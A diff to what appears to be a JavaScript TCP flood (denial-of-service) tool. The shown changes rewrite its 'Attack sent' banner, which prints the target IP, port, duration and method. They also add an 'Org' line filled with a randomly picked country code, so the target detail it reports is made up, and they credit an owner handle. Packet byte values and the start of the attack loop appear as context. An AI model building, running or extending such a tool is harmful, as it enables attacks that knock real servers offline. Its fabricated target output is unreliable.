@@ -1810,6 +1810,14 @@ let year = now.getFullYear();
 let month = now.getMonth() + 1;
 let hours = now.getHours();
 
+// Daftar negara
+var countries = ["IDN", "MYS", "SGP", "THA", "VNM", "PHL", "USA", "UK", "CAN", "RUS", "JPN", "MMR", "GER", "NDL"];
+
+// Mendapatkan negara secara acak
+var randomCountry = countries[Math.floor(Math.random() * countries.length)];
+
+// Menampilkan negara yang dipilih secara acak
+
 const nullHexs = [
 "\x00", 
 "\xFF", 
@@ -1817,17 +1825,15 @@ const nullHexs = [
 "\xA0"
 ];
 //Attack Send
-console.log(`✅𝐒𝐭𝐚𝐭𝐮𝐬 : 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐀𝐋𝐋 𝐒𝐄𝐑𝐕𝐄𝐑`);
-console.log("🎯𝗜𝗣 : "+ target)
-console.log("💫𝗣𝗢𝗥𝗧 :"+ port)
-console.log("🕐𝗧𝗜𝗠𝗘 : "+ time)
-console.log(`🤖𝐌𝐞𝐭𝐡𝐨𝐝𝐬: TCP`);
-console.log(`⏳𝗦𝘁𝗮𝗿𝘁 𝗔𝘁𝘁𝗮𝗰𝗸:${year}-${month}-${hours}`);
-console.log(``)
-console.log(`📑Target Details`);
-console.log(`💿𝗔𝗦𝗡    : ----`);
-console.log(`📎𝗜𝗦𝗣    : ----`);
-console.log(`🏳️𝗢𝗥𝗚     : Not Found`);
+console.log(`🟢Attack sent!!🟢`);
+console.log(``);
+console.log("Target: "+ target)
+console.log("Port: "+ port)
+console.log("Time: "+ time)
+console.log(`Methods: TCP`);
+console.log("Org: " + randomCountry);
+console.log(`Start Attack: ${year}-${month}-${hours}`);
+console.log(`Owner: @Erorr37cs`);
 
 //skid dek
 var int = setInterval(() => {
